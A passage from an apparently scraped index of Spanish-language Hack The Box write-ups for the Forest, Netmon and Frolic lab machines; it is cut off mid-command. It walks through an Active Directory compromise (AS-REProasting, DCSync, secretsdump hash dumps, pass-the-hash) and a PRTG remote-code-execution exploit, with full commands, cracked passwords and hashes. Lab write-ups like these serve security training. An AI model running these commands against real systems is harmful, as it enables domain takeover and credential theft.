microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49684/tcp open msrpc Microsoft Windows RPC 49703/tcp open msrpc Microsoft Windows RPC 49940/tcp open msrpc Microsoft Windows RPC Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: |_clock-skew: mean: 2h39m47s, deviation: 4h02m30s, median: 19m47s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: |_ start_date:  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 70.52 seconds La máquina tiene abiertos los puertos 53 (DNS), 88 (Kerberos), 135 (MS-RPC), 389 (LDAP) y 445 (SMB), entre otros.\n$ crackmapexec smb 10.10.10.161 SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) Además, vemos que la máquina es un controlador de dominio (DC) de un entorno de Active Directory (AD). Podemos empezar añadiendo htb.local en /etc/hosts.\nEnumeración por MS RPC Con rpcclient podemos enumerar usuarios del dominio, utilizando una sesión nula:\n$ rpcclient -U \u0026#39;\u0026#39; 10.10.10.161 -N -c enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[$331000-VK4ADACQNUCA] rid:[0x463] user:[SM_2c8eef0a09b545acb] rid:[0x464] user:[SM_ca8c2ed5bdab4db9a] rid:[0x465] user:[SM_75a538d3025e4db9a] rid:[0x466] user:[SM_681f53d4942840e18] rid:[0x467] user:[SM_1b41c9286325457bb] rid:[0x468] user:[SM_9b69f1b9d2cc45549] rid:[0x469] user:[SM_7c96b981967141ebb] rid:[0x46a] user:[SM_c75ee099d0a64c91b] rid:[0x46b] user:[SM_1ffab36a2f5f479cb] rid:[0x46c] user:[HealthMailboxc3d7722] rid:[0x46e] user:[HealthMailboxfc9daad] rid:[0x46f] user:[HealthMailboxc0a90c9] rid:[0x470] user:[HealthMailbox670628e] rid:[0x471] user:[HealthMailbox968e74d] rid:[0x472] user:[HealthMailbox83d6781] rid:[0x473] user:[HealthMailboxfd87238] rid:[0x474] user:[HealthMailboxb01ac64] rid:[0x475] user:[HealthMailbox7108a4e] rid:[0x477] user:[HealthMailbox0659cc1] rid:[0x478] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] Utilizando un poco de shell scripting y expresiones regulares, somos capaces de extraer los nombres de usuario y guardarlos en un archivo llamado users.txt:\n$ rpcclient -U \u0026#39;\u0026#39; 10.10.10.161 -N -c enumdomusers | grep -oP \u0026#39;\\[\\D*?\\]\u0026#39; | tr -d \u0026#39;[]\u0026#39; | tee users.txt Administrator Guest krbtgt DefaultAccount sebastien lucinda svc-alfresco andy mark santi Otra manera de obtener usuarios válidos es con el script krb5-enum-users.nse de nmap y una lista de usuarios (por ejemplo, una de SecLists):\n$ nmap --script krb5-enum-users --script-args krb5-enum-users.realm=\u0026#39;htb.local\u0026#39;,userdb=$WORDLISTS/SecLists/Usernames/Names/names.txt 10.10.10.161 -p 88 Starting Nmap 7.91 ( https://nmap.org ) Stats: 0:01:39 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 64.53% done; ETC: 07:53 (0:00:54 remaining) Nmap scan report for htb.local (10.10.10.161) Host is up (0.041s latency). PORT STATE SERVICE 88/tcp open kerberos-sec | krb5-enum-users: | Discovered Kerberos principals | lucinda@htb.local | sebastien@htb.local | mark@htb.local | andy@htb.local |_ forest@htb.local Nmap done: 1 IP address (1 host up) scanned in 143.69 seconds Ataque de AS-REProasting Ahora que tenemos nombres de usuario, podemos realizar un ataque de AS-REProasting. Descubrimos que svc-alfresco es \u0026ldquo;AS-REProasteable\u0026rdquo;:\n$ GetNPUsers.py htb.local/ -no-pass -usersfile users.txt Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation [-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User sebastien doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User lucinda doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$svc-alfresco@HTB.LOCAL:d90ded029bb968322842c61524dba44c$b826f6094adadef8674b55fc44f5fce9b0297439b3d501fb1906ae4efe90943d7e63418c54c6d449deabe7990ff404f33449593977a0ed21f81b44ebd5893f58fa42073485e464d123928e62f1f46c7b314a54780b2040bbea1ad53bccb99d59d730f2eb95102e3b62d1b95cec5249f62ae8c14e04130e9551cff3a94e5fb54caf758746c76be39453504f86ef2f468ed77fa6090d958cf81c88efb7c5bd8f00f1ba978537f8177e385167c35751ad38fa7d1717674446b8d0142c2e1aa275542a31b93a6eb5660aeffb5b26ea75685fcfee74053bdf346d55101c2d6c3e58fe50b375f73e35 [-] User andy doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User mark doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User santi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set El hash resultante es el Ticket Granting Ticket (TGT) del usuario svc-alfresco y se puede romper fácilmente con john y rockyou.txt:\n$ echo \u0026#39;$krb5asrep$23$svc-alfresco@HTB.LOCAL:d90ded029bb968322842c61524dba44c$b826f6094adadef8674b55fc44f5fce9b0297439b3d501fb1906ae4efe90943d7e63418c54c6d449deabe7990ff404f33449593977a0ed21f81b44ebd5893f58fa42073485e464d123928e62f1f46c7b314a54780b2040bbea1ad53bccb99d59d730f2eb95102e3b62d1b95cec5249f62ae8c14e04130e9551cff3a94e5fb54caf758746c76be39453504f86ef2f468ed77fa6090d958cf81c88efb7c5bd8f00f1ba978537f8177e385167c35751ad38fa7d1717674446b8d0142c2e1aa275542a31b93a6eb5660aeffb5b26ea75685fcfee74053bdf346d55101c2d6c3e58fe50b375f73e35\u0026#39; \u0026gt; hash $ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status s3rvice ($krb5asrep$23$svc-alfresco@HTB.LOCAL) 1g 0:00:00:05 DONE 0.1945g/s 794894p/s 794894c/s 794894C/s s4553592..s3r2s1 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed Ahora que tenemos credenciales válidas, podemos tratar de ver si existe algún usuario \u0026ldquo;kerberoasteable\u0026rdquo;:\n$ GetUserSPNs.py htb.local/svc-alfresco:s3rvice Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation No entries found! Pero no, no hay ninguno. Entonces, podemos comprobar si tenemos permisos de control remoto con crackmapexec:\n$ crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice WINRM 10.10.10.161 5985 FOREST [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local) WINRM 10.10.10.161 5985 FOREST [*] http://10.10.10.161:5985/wsman WINRM 10.10.10.161 5985 FOREST [+] htb.local\\svc-alfresco:s3rvice (Pwn3d!) Y como vemos, ahora podemos acceder a la máquina mediante evil-winrm:\n$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice Evil-WinRM shell v3.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents\u0026gt; whoami htb\\svc-alfresco *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents\u0026gt; type C:\\Users\\svc-alfresco\\Desktop\\user.txt e5e4e47ae7022664cda6eb013fb0d9ed Enumeración del dominio Para comprometer el DC, podemos utilizar BloodHound y ver vectores de ataque potenciales. Por tanto, necesitamos subir SharpHound.ps1 a la máquina y ejecutar Invoke-BloodHound -CollectionNames All para obtener un archivo ZIP con datos para BloodHound (el comando se añade al final del script de PowerShell):\n$ wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 $ echo \u0026#39;Invoke-BloodHound -CollectionNames All\u0026#39; \u0026gt;\u0026gt; SharpHound.ps1 La sesión de evil-winrm permite transferir archivos de manera muy cómoda:\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents\u0026gt; cd C:\\Windows\\Temp *Evil-WinRM* PS C:\\Windows\\Temp\u0026gt; mkdir privesc *Evil-WinRM* PS C:\\Windows\\Temp\u0026gt; cd privesc *Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; upload SharpHound.ps1 Info: Uploading SharpHound.ps1 to C:\\Windows\\Temp\\privesc\\SharpHound.ps1 Data: 1299032 bytes of 1299032 bytes copied Info: Upload successful! *Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; .\\SharpHound.ps1 *Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; dir  Directory: C:\\Windows\\Temp\\privesc Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 7/24/2021 5:49 AM 15541 20210724054945_BloodHound.zip -a---- 7/24/2021 5:49 AM 23611 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin -a---- 7/24/2021 5:49 AM 974276 SharpHound.ps1 *Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; download 20210724054945_BloodHound.zip Info: Downloading C:\\Windows\\Temp\\privesc\\20210724054945_BloodHound.zip to 20210724054945_BloodHound.zip Info: Download successful! Una vez importado el archivo ZIP en BloodHound, vemos el siguiente grafo con el camino más corto para convertirnos en administrador del dominio:\nEscalada de privilegios BloodHound nos dice que el usuario svc-alfresco puede añadir usuarios al dominio porque es miembro del grupo Account Operators (además de los grupos Privileged IT Accounts y Service Accounts). Para conseguir al usuario Administrator necesitamos pertenecer al grupo Exchange Windows Permissions.\nPrimero, tenemos que crear un usuario de dominio:\n*Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; net user rocky 7rocky7rocky /add /domain The command completed successfully. Luego, añadimos este nuevo usuario al grupo Exchange Windows Permissions:\n*Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; net group \u0026#34;Exchange Windows Permissions\u0026#34; rocky /add The command completed successfully. Ahora que tenemos un usuario válido miembro del grupo Exchange Windows Permissions, tenemos permisos para modificar la DACL (Directory Access Control List) del dominio htb.local (mostrado en BloodHound como WriteDacl). Básicamente, podemos otorgar cualquier privilegio al usuario rocky. BloodHound muestra una lista de comandos para ejecutar esta tarea (es necesario descargar PowerView.ps1 en la máquina):\n*Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; upload PowerView.ps1 Info: Uploading PowerView.ps1 to C:\\Windows\\Temp\\privesc\\PowerView.ps1 Data: 770279 bytes of 770279 bytes copied Info: Upload successful! *Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; .\\PowerView.ps1 *Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; $SecPassword = ConvertTo-SecureString \u0026#39;7rocky7rocky\u0026#39; -AsPlainText -Force *Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; $Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;htb.local\\rocky\u0026#39;, $SecPassword) *Evil-WinRM* PS C:\\Windows\\Temp\\privesc\u0026gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity \u0026#34;DC=htb,DC=local\u0026#34; -PrincipalIdentity rocky -Rights DCSync Entonces, podemos realizar un ataque DCSync com Mimikatz o secretsdump.py de Impacket para extraer todos los hashes NTLM de los usuarios del dominio (almacenados en el archivo NTDS.dit).\nUtilizando secretsdump.py podemos obtener el hash NTLM del usuario Administrator:\n$ secretsdump.py htb.local/rocky:7rocky7rocky@10.10.10.161 Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: ^C[-] Delete resume session file? [y/N] y [*] Cleaning up... Pass the Hash al usuario Administrator Finalmente, podemos realizar Pass the Hash con pth-winexe (entre otras herramientas) y ganar acceso a una consola de comandos como usuario Administrator_\n$ pth-winexe -U htb.local/Administrator%aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 //10.10.10.161 cmd.exe E_md4hash wrapper called. HASH PASS: Substituting user supplied NTLM HASH... Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;type C:\\Users\\Administrator\\Desktop\\root.txt f048153f202bbb2f82622b04d79129cc ","image":"/images/HTB/Forest/Forest.png","permalink":"https://7rocky.github.io/htb/forest/","section":"htb","summary":"Hack The Box. Windows. Máquina fácil. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de MS RPC, AS-REProasting, descrifrado de contraseñas, DCSync y Pass the Hash. Para comprometer la máquina se necesitan conocer técnicas básicas de enumeración y explotación de AD, además de usar BloodHound","time":5,"title":"Forest"},{"contents":"  SO: Windows   Dificultad: Fácil   Dirección IP: 10.10.10.152   Fecha: 02 / 03 / 2019   Escaneo de puertos # Nmap 7.92 scan as: nmap -sC -sV -Pn -o nmap/targeted 10.10.10.150 -p 21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 Nmap scan report for 10.10.10.150 Host is up. PORT STATE SERVICE VERSION 21/tcp filtered ftp 80/tcp filtered http 135/tcp filtered msrpc 139/tcp filtered netbios-ssn 445/tcp filtered microsoft-ds 5985/tcp filtered wsman 47001/tcp filtered winrm 49664/tcp filtered unknown 49665/tcp filtered unknown 49666/tcp filtered unknown 49667/tcp filtered unknown 49668/tcp filtered unknown 49669/tcp filtered unknown Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 7.31 seconds  La máquina tiene filtrados los puertos 21 (FTP), 80 (HTTP), 135 (MS-RPC), 139, 445 (SMB) and 5985 (WinRM), entre otros.\n$ crackmapexec smb 10.10.10.152 SMB 10.10.10.152 445 NETMON [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)  Enumeración web Podemos comenzar yendo a http://10.10.10.152 y ver una página web de PRTG Network Monitor:\nAquí podemos probar con las credentiales por defecto (prtgadmin:prtgadmin), pero no funcionan.\nPodemos buscar por vulnerabilidades y exploits y encontrar que podemos ejecutar comandos como system en la máquina siempre que estemos autenticados:\n$ searchsploit PRTG ------------------------------------------------------------------------- --------------------------- Exploit Title | Path ------------------------------------------------------------------------- --------------------------- PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution | windows/webapps/46527.sh PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS | windows/webapps/49156.txt PRTG Network Monitor \u0026lt; 18.1.39.1648 - Stack Overflow (Denial of Service) | windows_x86/dos/44500.py PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting | java/webapps/34108.txt ------------------------------------------------------------------------- --------------------------- Shellcodes: No Results  Como la versión que tenemos es PRTG Network Monitor 18.1.37.13946, podría ser vulnerable. Por tanto, tenemos que conseguir credenciales válidas.\nEnumeración de FTP Vamos a tratar de conectarnos al servidor FTP usando una sesión anonymous:\n$ ftp 10.10.10.152 Connected to 10.10.10.152. 220 Microsoft FTP Service Name (10.10.10.152:rocky): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in.  Y estamos conectados. En este punto, podemos encontrar la flag user.txt en C:\\Users\\Public:\nftp\u0026gt; dir 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 12:18AM 1024 .rnd 02-25-19 10:15PM \u0026lt;DIR\u0026gt; inetpub 07-16-16 09:18AM \u0026lt;DIR\u0026gt; PerfLogs 02-25-19 10:56PM \u0026lt;DIR\u0026gt; Program Files 02-03-19 12:28AM \u0026lt;DIR\u0026gt; Program Files (x86) 07-17-22 09:14PM \u0026lt;DIR\u0026gt; Users 02-25-19 11:49PM \u0026lt;DIR\u0026gt; Windows 226 Transfer complete. ftp\u0026gt; dir Users 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 11:44PM \u0026lt;DIR\u0026gt; Administrator 07-17-22 09:13PM \u0026lt;DIR\u0026gt; Public 226 Transfer complete. ftp\u0026gt; dir Users\\Public 200 PORT command successful. 550 The system cannot find the file specified. ftp\u0026gt; dir Users/Public 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 08:05AM \u0026lt;DIR\u0026gt; Documents 07-16-16 09:18AM \u0026lt;DIR\u0026gt; Downloads 07-16-16 09:18AM \u0026lt;DIR\u0026gt; Music 07-16-16 09:18AM \u0026lt;DIR\u0026gt; Pictures 07-17-22 02:23PM 34 user.txt 07-16-16 09:18AM \u0026lt;DIR\u0026gt; Videos 226 Transfer complete. ftp\u0026gt; cd Users/Public 250 CWD command successful. ftp\u0026gt; get user.txt 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 34 bytes received in 0,158 seconds (215 bytes/s) ftp\u0026gt; quit $ catn user.txt e8627c9bb6e4f87b3eb908adb1ff58dd  De acuerdo con www.paessler.com, las credenciales de PRTG Network Monitor se almacenan en C:\\ProgramData\\Paessler\\PRTG Network Monitor\\PRTG Configuration.old.\nAunque no se vea C:\\ProgramData en FTP, sí que podemos ir a esta carpeta y listar los archivos de configuración:\n$ ftp 10.10.10.152 Connected to 10.10.10.152. 220 Microsoft FTP Service Name (10.10.10.152:rocky): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. ftp\u0026gt; dir 200 PORT command successful. 150 Opening ASCII mode data connection. 02-03-19 12:18AM 1024 .rnd 02-25-19 10:15PM \u0026lt;DIR\u0026gt; inetpub 07-16-16 09:18AM \u0026lt;DIR\u0026gt; PerfLogs 02-25-19 10:56PM \u0026lt;DIR\u0026gt; Program Files 02-03-19 12:28AM \u0026lt;DIR\u0026gt; Program Files (x86) 02-03-19 08:08AM \u0026lt;DIR\u0026gt; Users 02-25-19 11:49PM \u0026lt;DIR\u0026gt; Windows 226 Transfer complete. ftp\u0026gt; cd ProgramData 250 CWD command successful. ftp\u0026gt; cd Paessler 250 CWD command successful. ftp\u0026gt; dir 200 PORT command successful. 150 Opening ASCII mode data connection. 07-17-22 08:41PM \u0026lt;DIR\u0026gt; PRTG Network Monitor 226 Transfer complete. ftp\u0026gt; cd PRTG\\ Network\\ Monitor 250 CWD command successful. ftp\u0026gt; dir 200 PORT command successful. 150 Opening ASCII mode data connection. 12-15-21 08:23AM \u0026lt;DIR\u0026gt; Configuration Auto-Backups 07-17-22 08:00PM \u0026lt;DIR\u0026gt; Log Database 02-03-19 12:18AM \u0026lt;DIR\u0026gt; Logs (Debug) 02-03-19 12:18AM \u0026lt;DIR\u0026gt; Logs (Sensors) 02-03-19 12:18AM \u0026lt;DIR\u0026gt; Logs (System) 07-17-22 02:24PM \u0026lt;DIR\u0026gt; Logs (Web Server) 07-17-22 08:04PM \u0026lt;DIR\u0026gt; Monitoring Database 02-25-19 10:54PM 1189697 PRTG Configuration.dat 02-25-19 10:54PM 1189697 PRTG Configuration.old 07-14-18 03:13AM 1153755 PRTG Configuration.old.bak 07-17-22 08:41PM 1724089 PRTG Graph Data Cache.dat 02-25-19 11:00PM \u0026lt;DIR\u0026gt; Report PDFs 02-03-19 12:18AM \u0026lt;DIR\u0026gt; System Information Database 02-03-19 12:40AM \u0026lt;DIR\u0026gt; Ticket Database 02-03-19 12:18AM \u0026lt;DIR\u0026gt; ToDo Database 226 Transfer complete.  En este punto, vamos a descargar todos los archivos de configuración. Podemos buscar por \u0026quot;password\u0026quot; en todos ellos y encontrar una hard-coded en un comentario en PRTG Configuration.old.bak:\n$ grep -A 2 dbpassword PRTG\\ Configuration.old.bak | head \u0026lt;dbpassword\u0026gt; \u0026lt;!-- User: prtgadmin --\u0026gt; PrTg@dmin2018 \u0026lt;/dbpassword\u0026gt; \u0026lt;dbtimeout\u0026gt; 60 -- \u0026lt;dbpassword\u0026gt; \u0026lt;flags\u0026gt; \u0026lt;inherited/\u0026gt;  Escalada de privilegios Si probamos prtgadmin:PrTg@dmin2018, no funciona. Sin embargo, podemos pensar que la contraseña ha sido actualizada y deducir que ahora es PrTg@dmin2019, PrTg@dmin2020, etc. De hecho, funciona con PrTg@dmin2019. Ahora estamos autenticados:\nEn este punto, podemos usar el exploit que encontramos antes: (46527.sh). Para ello, necesitaremos coger las cookies del navegador y pasarlas al script:\n$ bash 46527.sh -u http://10.10.10.152 -c \"_ga=GA1.4.68336878.1658105273; _gid=GA1.4.1335940588.1658105273; OCTOPUS1813713946=e0YwNkU0RUZGLUQyQkUtNDAyMi1CMEY5LUM3QURENkVEODlEMn0%3D; _gat=1\" [+]#########################################################################[+] [*] Authenticated PRTG network Monitor remote code execution [*] [+]#########################################################################[+] [*] Date: 11/03/2019 [*] [+]#########################################################################[+] [*] Author: https://github.com/M4LV0 lorn3m4lvo@protonmail.com [*] [+]#########################################################################[+] [*] Vendor Homepage: https://www.paessler.com/prtg [*] [*] Version: 18.2.38 [*] [*] CVE: CVE-2018-9276 [*] [*] Reference: https://www.codewatch.org/blog/?p=453 [*] [+]#########################################################################[+] # login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script. # run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' [+]#########################################################################[+] [*] file created [*] sending notification wait.... [*] adding a new user 'pentest' with password 'P3nT3st' [*] sending notification wait.... [*] adding a user pentest to the administrators group [*] sending notification wait.... [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun!  El exploit crea un usuario llamado pentest con contraseña P3nT3st! y lo añade al grupo Administrators. Por tanto, podemos comprobar que tenemos privilegios elevados con crackmapexec:\n$ crackmapexec smb 10.10.10.152 -u pentest -p P3nT3st! SMB 10.10.10.152 445 NETMON [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True) SMB 10.10.10.152 445 NETMON [+] netmon\\pentest:P3nT3st! (Pwn3d!)  Como vemos Pwn3d!, entonces nos podemos conectar a la máquina y leer la flag root.txt usando evil-winrm:\n$ evil-winrm -i 10.10.10.152 -u pentest -p P3nT3st! Evil-WinRM shell v3.4 Info: Establishing connection to remote endpoint *Evil-WinRM*PS C:\\Users\\pentest\\Documents\u0026gt; type C:\\Users\\Administrator\\Desktop\\root.txt 0523e6a565d4df9901fff01ef2a9b75f  ","image":"/images/HTB/Netmon/Netmon.png","permalink":"https://7rocky.github.io/htb/netmon/","section":"htb","summary":"Hack The Box. Windows. Máquina fácil. Esta máquina presenta una instancia de PRTG Network Monitor que es vulnerable a RCE como system. Nos podemos conectar a FTP con credentiales anonymous y leer una copia de seguridad de un archivo de configuración de PRTG Network Monitor y obtener una contraseña antigua, que proporciona el formato para adivinar la contraseña actual. Luego, podemos ejecutar el exploit público para conseguir RCE y convertirnos en Administrator","time":5,"title":"Netmon"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.10.111   Fecha: 13 / 10 / 2018   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.111 -p 22,139,445,1880,9999 Nmap scan report for 10.10.10.111 Host is up (0.074s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA) | 256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA) |_ 256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 1880/tcp open http Node.js (Express middleware) |_http-title: Node-RED 9999/tcp open http nginx 1.10.3 (Ubuntu) |_http-title: Welcome to nginx! |_http-server-header: nginx/1.10.3 (Ubuntu) Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required |_clock-skew: mean: -1h49m59s, deviation: 3h10m31s, median: 0s | smb2-time: | date: 2022-07-17T16:54:51 |_ start_date: N/A | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: frolic | NetBIOS computer name: FROLIC\\x00 | Domain name: \\x00 | FQDN: frolic |_ System time: 2022-07-17T22:24:51+05:30 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: FROLIC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 16.23 seconds  La máquina tiene abiertos los puertos 22 (SSH), 139, 445 (SMB), 1880 y 9999 (HTTP).\nEnumeración web Si vamos a http://10.10.10.111:1880 veremos una instancia de Node-RED:\nPodemos probar con credenciales por defecto (NR_account:NodeRed#123), pero no funcionan.\nEn http://10.10.10.111:9999 vemos la página por defecto de nginx:\nVamos a aplicar fuzzing con ffuf para enumerar más rutas:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.111:9999/FUZZ admin [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 78ms] test [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 40ms] dev [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 127ms] backup [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 43ms] loop [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 43ms] [Status: 200, Size: 637, Words: 79, Lines: 29, Duration: 52ms]  Si vamos a /test, veremos un phpinfo:\nEn /backup tenemos dos archivos un un directorio loop:\n$ curl 10.10.10.111:9999/backup/ password.txt user.txt loop/ $ curl 10.10.10.111:9999/backup/loop/ \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;403 Forbidden\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body bgcolor=\"white\"\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;403 Forbidden\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.10.3 (Ubuntu)\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $ curl 10.10.10.111:9999/backup/user.txt user - admin $ curl 10.10.10.111:9999/backup/password.txt password - imnothuman  No tenemos permisos para entrar en loop, pero a lo mejor las credenciales las necesitamos después.\nEn /admin tenemos un formulario de inicio de sesión:\nSi probamos con credenciales cualesquiera, aparecerá una alerta:\nEsto es indicio de que la autenticación se gestiona desde JavaScript, por lo que vamos a ver el código fuente:\nEl archivo de JavaScript está en /admin/js/login.js. Vamos a verlo:\n$ curl 